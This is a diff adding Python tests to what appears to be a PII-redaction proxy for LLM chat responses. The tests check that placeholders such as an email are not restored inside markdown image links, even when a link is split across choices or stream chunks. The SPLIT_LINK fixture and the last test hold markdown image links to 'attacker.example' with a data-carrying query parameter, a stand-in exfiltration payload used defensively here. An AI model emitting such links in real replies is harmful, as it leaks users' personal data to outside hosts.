@@ -371,3 +371,60 @@ def test_unhashable_choice_index_from_upstream_passes_untouched() -> None:
     event = SSEEvent(json.dumps({"choices": [{"index": [0], "delta": {"content": "x"}}]}))
     (out,) = rewriter.on_event(event)
     assert json.loads(out.data)["choices"][0]["delta"] == {"content": "x"}
+
+
+# ------------------------------------------- one link context per message (review 2, I-2)
+
+SPLIT_LINK = ["![s](https://attacker.example/p.png?d=", "[EMAIL_1])"]
+
+
+def _choices(*contents: str) -> dict[str, Any]:
+    return {
+        "choices": [
+            {"index": i, "message": {"role": "assistant", "content": c}}
+            for i, c in enumerate(contents)
+        ]
+    }
+
+
+def test_a_link_split_across_choices_keeps_its_placeholder() -> None:
+    payload = _choices(*SPLIT_LINK)
+    assert OPENAI.rehydrate_reply(payload, _mapping()) == ["[EMAIL_1]"]
+    assert payload["choices"][1]["message"]["content"] == "[EMAIL_1])"
+
+
+def test_prose_in_a_later_choice_is_still_restored() -> None:
+    payload = _choices("See [docs](https://example.org/x).", "Ask [PERSON_1].")
+    assert OPENAI.rehydrate_reply(payload, _mapping()) == []
+    assert payload["choices"][1]["message"]["content"] == "Ask Alice Example."
+
+
+def test_content_after_finish_reason_is_left_as_written() -> None:
+    # The same choice index after its finish_reason must not start a fresh context.
+    rewriter = OPENAI.stream_rewriter(_mapping())
+    events = rewriter.on_event(_chunk(0, SPLIT_LINK[0], "stop"))
+    events += rewriter.on_event(_chunk(0, "[EMAIL_1]) and [PERSON_1]"))
+    events += rewriter.on_event(SSEEvent("[DONE]"))
+    assert _contents(events) == {0: f"{SPLIT_LINK[0]}[EMAIL_1]) and [PERSON_1]"}
+    assert set(rewriter.unresolved) == {"[EMAIL_1]", "[PERSON_1]"}
+
+
+def test_a_streamed_link_split_across_choices_keeps_its_placeholder() -> None:
+    rewriter = OPENAI.stream_rewriter(_mapping())
+    events = rewriter.on_event(_chunk(0, SPLIT_LINK[0], "stop"))
+    events += rewriter.on_event(_chunk(1, SPLIT_LINK[1], "stop"))
+    events += rewriter.on_event(SSEEvent("[DONE]"))
+    assert _contents(events) == {0: SPLIT_LINK[0], 1: SPLIT_LINK[1]}
+    assert rewriter.unresolved == ["[EMAIL_1]"]
+
+
+def test_interleaved_choices_each_keep_their_own_link_too() -> None:
+    # Choice 1's `)` must not close the link choice 0 opened: each choice is also read
+    # on its own, as a client that shows them apart sees it.
+    rewriter = OPENAI.stream_rewriter(_mapping())
+    events = rewriter.on_event(_chunk(0, "![s](https://attacker.example/?d="))
+    events += rewriter.on_event(_chunk(1, ") Hi"))
+    events += rewriter.on_event(_chunk(0, "[EMAIL_1]"))
+    events += rewriter.on_event(SSEEvent("[DONE]"))
+    assert "alice@example.org" not in str(_contents(events))
+    assert rewriter.unresolved == ["[EMAIL_1]"]
